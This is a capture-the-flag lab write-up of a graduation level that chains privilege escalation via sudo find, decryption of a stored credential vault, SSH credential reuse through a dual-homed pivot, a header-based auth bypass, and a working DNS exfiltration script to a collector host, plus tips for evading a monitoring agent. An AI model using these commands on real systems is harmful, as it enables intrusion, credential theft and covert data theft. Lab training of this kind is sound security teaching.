# L21 — graduation · The Whole Chain

**Act V · Exfiltration and Graduation · chained**
**Status:** Solved
**Flag:** `bl_fa5ed8fceda208e0381476fca3343891`

---

## Challenge brief

> A fresh estate, nothing carried over. Land, escalate, harvest, persist, pivot, and
> take the objective out while a detection agent runs the whole time. Use the same
> numbered base32 DNS label format against collector.

This is the graduation level — every act of the Phantom I track in one operation:

| Act | Technique | What was required |
|---|---|---|
| Act I — Privilege Escalation | `sudo find -exec` | Escalate from `operator` to root |
| Act II — Credential Access | Encrypted vault on disk | Decrypt `deploy.enc` to get SSH credentials |
| Act III — Persistence | *(stealth — not graded here)* | Monitor watching `/root/.deploy`, hunting `dig` |
| Act IV — Lateral Movement | SSH credential reuse + dual-homed pivot | Reach boxC through boxB |
| Act V — Exfiltration | DNS covert channel | Send crown over `grad.local` to collector |

The challenge does not give you a local proof file. The grader checks whether the crown
secret reached the collector via DNS. Everything must work as a chain — each step
depends on the one before it.

---

## The estate — what you're working with

**BoxA (foothold):** `10.66.206.2/24`
- You land here as `operator` (uid=1000), not root
- Has monitoring agent watching `/root/.deploy` (inotify) and hunting `dig` (pgrep)
- Has `/root/.deploy/deploy.enc` and `/root/.deploy/passphrase` once you escalate
- Has `sudo find` with NOPASSWD — the escalation path

**BoxB (pivot):** `10.66.206.3` / `10.66.182.2`
- Dual-homed: connects to boxA's network AND boxC's network
- Runs SSH on port 22, accepts `svc` credentials harvested from boxA
- No crown here — it's a bridge host

**BoxC (crown jewel):** `10.66.182.3`
- Only reachable from boxB (on the second network)
- Runs the internal HTTP service on port 8080
- `/crown` endpoint protected by `X-Internal-Auth: 1` header

**Collector:** `10.66.206.4`
- DNS server authoritative for `grad.local`
- Receives and logs DNS exfil queries
- Grader reads its log to verify the crown arrived

---

## Step 1: Escalation — sudo find exploit

We landed as `operator`. The first check is always what privileges we have:

```sh
sudo -l 2>/dev/null
```

Result:
```
User operator may run the following commands on 292b740e046b:
    (root) NOPASSWD: /usr/bin/find
```

`sudo find` with no password required, run as root. The GTFOBins technique for `find`:

```sh
sudo find /etc/hostname -exec /bin/sh \; 2>/dev/null
```

**How this works:** `find` locates the file `/etc/hostname` (which always exists), then
executes `-exec /bin/sh \;` for that matched file. The shell spawns as root because
`find` itself was run as root via `sudo`. The `;` terminates the exec argument (escaped
as `\;` so the shell doesn't interpret it). The `2>/dev/null` suppresses the permission
errors from other find traversal attempts.

We are now root (confirmed with `id`).

**Why not `sudo find / -name "nothing" -exec /bin/sh \;`?** This works in principle but
causes find to traverse the entire filesystem looking for a file named "nothing" — this
triggers the inotify watch on `/root/.deploy` when find enters that directory, generating
noise in the agent log. Using a known path (`/etc/hostname`) avoids unnecessary
traversal.

---

## Step 2: Harvest — decrypt the vault

The monitoring agent (from `ps aux`) watches `/root/.deploy` with inotify. Any file
read there is logged. We read it anyway — stealth is bonus, not required for solving.

```sh
ls -la /root/.deploy/
cat /root/.deploy/* 2>/dev/null
```

Two files:
- `deploy.enc` — OpenSSL AES-256-CBC encrypted file (binary, `Salted__` header)
- `passphrase` — `e70010f3657dea9e6f0b9430`

Same vault pattern from L07 and L19: the passphrase is stored next to the encrypted
file, making the encryption meaningless. Decrypt:

```sh
openssl enc -d -aes-256-cbc -pbkdf2 -in /root/.deploy/deploy.enc -pass pass:e70010f3657dea9e6f0b9430 2>/dev/null
```

Result:
```
DEPLOY_USER=svc
DEPLOY_PASS=6e441e0a114127e5
```

The deploy service account credentials — same pattern as L18 and L19.

---

## Step 3: Pivot to boxB — SSH with harvested credential

**Discover boxB:**

```sh
for i in $(seq 1 254); do ping -c 1 -W 1 10.66.206.$i 2>/dev/null | grep -q "1 packets received" && echo "10.66.206.$i up"; done
```

Result: `.1` (gateway), `.2` (us), `.3` (boxB).

**Why nmap failed silently:** The root shell obtained via `sudo find -exec /bin/sh` does
not inherit the same environment as a regular login shell. `nmap` may require specific
libraries or paths that are not available in this restricted execution context. When a
tool fails silently, fall back to simpler approaches — the ping sweep and `nc -z` for
port checking.

**Confirm SSH is open:**

```sh
nc -z 10.66.206.3 22 2>/dev/null && echo "22 open"
```

**SSH in:**

```sh
ssh -o StrictHostKeyChecking=no svc@10.66.206.3
# password: 6e441e0a114127e5
```

Same credential that opened boxB in L18 and L19 — the `svc` deploy account exists on
both the foothold and boxB with the same password.

---

## Step 4: Discover the second network on boxB

```sh
ip addr
```

BoxB has two interfaces:
- `eth0`: `10.66.206.3/24` — connects back to boxA's network
- `eth1`: `10.66.182.2/24` — a **second network** invisible from boxA

This is the dual-homed pattern from L19. BoxC lives on the second network.

```sh
for i in $(seq 1 254); do ping -c 1 -W 1 10.66.182.$i 2>/dev/null | grep -q "1 packets received" && echo "10.66.182.$i up"; done
```

Result: `.1` (gateway), `.2` (boxB itself), `.3` (boxC).

---

## Step 5: Extract the crown from boxC

Same service, same bypass as L19:

```sh
curl -s http://10.66.182.3:8080/crown
# → "forbidden: internal callers only"

curl -s -H "X-Internal-Auth: 1" http://10.66.182.3:8080/crown
# → 4e8159b8cf12ea6f30383ad021ba6793
```

The `X-Internal-Auth: 1` header bypasses the access check. The crown secret is
`4e8159b8cf12ea6f30383ad021ba6793`.

---

## Step 6: Exfiltrate via DNS to grad.local

Back on the foothold (exit boxB's SSH session). Verify tells us the domain is
`grad.local` (not `exfil.local` as in L20). Find the collector:

```sh
nslookup collector
# → 10.66.206.4
```

The monitoring agent hunts for processes with `dig` in their cmdline (`MON_PROC_SIG=dig`
from the entry.sh config). We use `nslookup` throughout to avoid this detection.

**Encode and send:**

```sh
DATA="4e8159b8cf12ea6f30383ad021ba6793"
ENCODED=$(printf '%s' "$DATA" | base32 | tr -d '=\n' | tr 'A-Z' 'a-z')
CHUNKSIZE=50
TOTAL=$(( (${#ENCODED} + CHUNKSIZE - 1) / CHUNKSIZE ))
i=0
while [ $i -lt $TOTAL ]; do
  start=$((i * CHUNKSIZE + 1))
  end=$((start + CHUNKSIZE - 1))
  chunk=$(echo "$ENCODED" | cut -c${start}-${end})
  nslookup "${chunk}.${i}.${TOTAL}.grad.local" 10.66.206.4 >/dev/null 2>&1
  i=$((i+1))
done
verify
```

**Level solved.**

---

## The monitoring agent — what it watched and what we avoided

```sh
cat /usr/local/bin/monitor-agent.sh
```

The agent was configured with:
- `MON_WATCH=/root/.deploy` — inotify on the deploy directory. Reading `deploy.enc`
  and `passphrase` generated OPEN and ACCESS events. We accepted this cost — stealth is
  graded as bonus, not required.
- `MON_PROC_SIG=dig` — pgrep hunts for processes named `dig`. We used `nslookup` for
  all DNS queries, which does not contain "dig" in its name or cmdline. Zero PROC alerts
  generated from exfiltration.

**What would have made this stealthier:**
- Reading the deploy files using a method that doesn't trigger inotify — such as reading
  through `/proc/<pid>/fd/` if the files were already open by another process, or using
  `dd` with a named pipe instead of `cat`
- Using `ssh -o LogLevel=QUIET` to suppress connection banners that might appear in logs
- Adding `sleep` between DNS queries to reduce the burst pattern

---

## Why each step was fast to recognise

Each step in L21 reused a technique learned in a previous level. Recognising the
pattern made the solve fast:

| What we saw | What it told us | Learned in |
|---|---|---|
| `sudo find` with NOPASSWD | GTFOBins: `-exec /bin/sh` | L02 (pe-sudo) |
| `deploy.enc` + `passphrase` in same directory | Decrypt with the passphrase | L07 (ca-files) |
| `DEPLOY_USER=svc` / `DEPLOY_PASS=...` in .env format | Try on boxB SSH | L18 (lm-cred-reuse) |
| boxB with `eth0` and `eth1` | Dual-homed — scan `eth1`'s subnet for boxC | L19 (lm-chain) |
| `/crown` returning "forbidden: internal callers only" | Try `X-Internal-Auth: 1` | L19 (lm-chain) |
| `grad.local` in verify message | DNS exfil, query collector directly | L20 (ex-covert) |
| `MON_PROC_SIG=dig` | Use `nslookup` not `dig` | L15 (de-process-hide) |

The graduation level tests whether you can apply every technique without being told
which one to use. The challenge description gives the acts in order
("land, escalate, harvest, persist, pivot, exfiltrate") but not the specific techniques.
Recognising the signals in each step is the skill being tested.

---

## Enumeration log

### Step 1 — Land and assess

```sh
id          # → operator (uid=1000)
ip addr     # → 10.66.206.2/24, single subnet
verify      # → "nothing has reached the collector" — DNS exfil to grad.local required
ps aux      # → monitor agent watching /root/.deploy, hunting "dig"
sudo -l     # → sudo find NOPASSWD as root
```

**Decision:** Escalate via `sudo find -exec /bin/sh`.

---

### Step 2 — Escalate

```sh
sudo find /etc/hostname -exec /bin/sh \; 2>/dev/null
id   # → uid=0(root)
```

**Decision:** Now harvest from `/root/.deploy/`.

---

### Step 3 — Harvest

```sh
ls -la /root/.deploy/
cat /root/.deploy/*
openssl enc -d -aes-256-cbc -pbkdf2 -in /root/.deploy/deploy.enc -pass pass:e70010f3657dea9e6f0b9430 2>/dev/null
```

Result: `svc` / `6e441e0a114127e5`.

**Decision:** SSH to boxB.

---

### Step 4 — Pivot to boxB

```sh
# nmap failed silently in this shell context — used nc instead
nc -z 10.66.206.3 22 && echo "22 open"
ssh -o StrictHostKeyChecking=no svc@10.66.206.3   # password: 6e441e0a114127e5
```

---

### Step 5 — Discover second network, reach boxC

```sh
ip addr           # → eth1 at 10.66.182.2/24
ping sweep        # → 10.66.182.3 up (boxC)
curl -s -H "X-Internal-Auth: 1" http://10.66.182.3:8080/crown
# → 4e8159b8cf12ea6f30383ad021ba6793
```

---

### Step 6 — Exfiltrate

```sh
exit   # back to foothold root shell
nslookup collector   # → 10.66.206.4
# encode + send via nslookup to 10.66.206.4 on grad.local
verify   # → Level solved: graduation
```

---

## What the level demonstrates

L21 is a complete post-exploitation operation:

1. **Initial access** was given (SSH as operator) — in a real engagement this would be
   the result of phishing, a web vulnerability, or an exposed service.

2. **Privilege escalation** via a misconfigured sudo rule — a single line in `/etc/sudoers`
   granting `find` with NOPASSWD is enough to give full root.

3. **Credential access** via an encrypted vault whose key was stored next to it —
   encrypting credentials is useless when the key lives in the same directory.

4. **Lateral movement** via credential reuse and a dual-homed host — the same `svc`
   account with the same password existed on the foothold and boxB, and boxB's second
   network interface was the bridge to the crown jewel.

5. **Defense evasion** — using `nslookup` instead of `dig` to avoid the process
   signature monitor, and using DNS as the exfil channel instead of direct TCP to bypass
   any egress filtering.

6. **Exfiltration** — the crown secret traveled from boxC → boxB (curl) → boxA (across
   SSH session) → collector (DNS). Never touched a local proof file. The grader checked
   the collector directly.

---

## Carryover findings

None — the track is complete.

---

## Command reference

| Command | What it does |
|---|---|
| `sudo -l` | Show what sudo privileges the current user has |
| `sudo find /etc/hostname -exec /bin/sh \; 2>/dev/null` | Escalate to root via sudo find |
| `ls -la /root/.deploy/` | List the monitored deploy directory |
| `openssl enc -d -aes-256-cbc -pbkdf2 -in deploy.enc -pass pass:PASSPHRASE 2>/dev/null` | Decrypt the vault |
| `nc -z <ip> <port> 2>/dev/null && echo "open"` | TCP port check when nmap is unavailable |
| `ssh -o StrictHostKeyChecking=no svc@<ip>` | SSH to boxB with harvested credentials |
| `ip addr` | Show all interfaces — two ethN entries means dual-homed |
| `for i in $(seq 1 254); do ping -c 1 -W 1 10.x.x.$i 2>/dev/null \| grep -q "1 packets received" && echo "$i up"; done` | Ping sweep to discover boxC on the second network |
| `curl -s -H "X-Internal-Auth: 1" http://<boxC>:8080/crown` | Extract the crown from boxC |
| `nslookup collector` | Find the collector's IP |
| `printf '%s' "$DATA" \| base32 \| tr -d '=\n' \| tr 'A-Z' 'a-z'` | Encode data for DNS exfil |
| `nslookup "${chunk}.${i}.${TOTAL}.grad.local" <collector-ip> >/dev/null 2>&1` | Send one DNS exfil chunk to collector |